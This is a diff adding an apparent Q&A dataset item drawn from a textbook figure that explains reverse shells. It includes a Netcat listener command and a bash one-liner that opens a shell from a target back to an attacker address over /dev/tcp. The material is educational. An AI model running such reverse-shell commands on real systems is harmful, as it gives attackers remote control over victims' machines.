@@ -1,0 +1,21 @@
+TECHNIQUE / QUESTION:
+Explain the purpose, syntax, and usage of the code/command in the following text: (Context: from Document)
+
+CONTEXT:
+Source: Unknown
+Section: General
+Pages: N/A
+
+METHOD / ANSWER:
+Figure 6-3 How a Reverse Shell Works
+In Figure 6-3, the attacker sets up a listener on their own machine
+(10.1.2.3), waiting for incoming connections on a specified port (1337). The
+target machine, once compromised, runs a script or command that connects
+back to the attacker's machine, effectively opening a shell on the target that
+the attacker can control.
+The following is an example of using Netcat on the attacker's machine
+(listening on port 1337):
+nc -lvp 1337
+In the target system, the following bash command can be executed to
+establish a reverse shell:
+bash -i >& /dev/tcp/10.1.2.3/1337 0>&1
